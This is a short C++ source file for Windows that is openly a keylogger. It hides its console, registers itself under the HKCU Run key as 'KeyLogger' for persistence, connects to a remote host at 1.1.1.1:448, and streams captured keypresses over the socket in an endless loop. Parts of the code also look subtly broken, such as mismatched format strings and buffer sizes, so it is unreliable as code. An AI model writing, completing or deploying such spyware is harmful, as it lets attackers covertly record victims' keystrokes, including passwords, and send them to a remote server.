#include <Windows.h>
#include <time.h>

#include "client.h"

#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "Ws2_32.lib")

int main(int argc, char** argv) {
	FreeConsole();

	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG status = RegSetValueEx(hkey, L"KeyLogger", 0, REG_SZ, (BYTE*)argv[0], (std::string(argv[0]).size() + 1) * sizeof(wchar_t));

	char key = 'A';
	client* connection = new client;
	connection->initialize("1.1.1.1", 448);
	while (true) {
		for (int key = 8; key <= 190; key++) {
			const auto state
				= GetAsyncKeyState(key);
			if (state == -32767) {
				char keyBuffer[120];
				sprintf(keyBuffer, "%s|%s\r\n", gmtime(0), std::to_string(state));
				send(connection->csocket, keyBuffer, sizeof(keyBuffer), NULL);
			}
		}
	}
}
